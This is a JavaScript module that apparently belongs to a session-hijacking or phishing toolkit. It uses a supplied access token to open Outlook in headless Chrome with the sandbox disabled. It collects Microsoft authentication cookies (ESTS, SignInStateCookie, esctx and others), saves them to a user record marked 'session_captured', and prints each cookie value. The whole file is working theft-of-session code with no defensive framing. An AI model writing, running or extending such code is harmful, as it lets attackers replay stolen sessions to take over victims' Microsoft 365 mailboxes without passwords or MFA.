const puppeteer = require('puppeteer-core');
const User = require('../models/user');

// Capture cookies using headless browser
async function captureOutlookCookies(userId, accessToken) {
  try {
    const browser = await puppeteer.launch({ 
      headless: true,
      executablePath: '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome', // macOS Chrome path
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();
    
    // Set authorization header
    await page.setExtraHTTPHeaders({
      'Authorization': `Bearer ${accessToken}`
    });
    
    // Navigate to Outlook with longer timeout
    await page.goto('https://outlook.office.com', { 
      waitUntil: 'domcontentloaded',
      timeout: 60000 // 60 seconds
    });
    
    // Wait for authentication cookies to be set
    await page.waitForTimeout(5000);
    
    // Get all cookies from all domains
    const allCookies = await page.cookies('https://outlook.office.com', 'https://login.microsoftonline.com');
    
    // Filter ALL Microsoft authentication cookies
    const authCookies = allCookies.filter(cookie => 
      cookie.name.includes('ESTS') ||           // Main auth tokens
      cookie.name.includes('fpc') ||            // Fingerprint cookie
      cookie.name.includes('buid') ||           // Browser User ID
      cookie.name.includes('SignInStateCookie') || // Sign-in state
      cookie.name.includes('AADSTS') ||         // Azure AD tokens
      cookie.name.includes('esctx') ||          // Execution context
      cookie.name.includes('x-ms-') ||          // Microsoft headers
      cookie.name.includes('stsservicecookie') || // STS service
      cookie.domain.includes('microsoftonline') ||
      cookie.domain.includes('outlook') ||
      cookie.domain.includes('office') ||
      cookie.domain.includes('microsoft')
    );
    
    // Save to database
    await User.findByIdAndUpdate(userId, {
      sessionCookies: authCookies,
      cookieStatus: "session_captured"
    });
    
    console.log(`\n🤖 PUPPETEER CAPTURED ${authCookies.length} SESSION COOKIES:`);
    authCookies.forEach(cookie => {
      console.log(`🍪 ${cookie.name}: ${cookie.value}`);
      console.log(`   Domain: ${cookie.domain} | Path: ${cookie.path} | Secure: ${cookie.secure}\n`);
    });
    
    await browser.close();
    return authCookies;
  } catch (error) {
    console.error('Puppeteer capture error:', error);
    return [];
  }
}

module.exports = { captureOutlookCookies };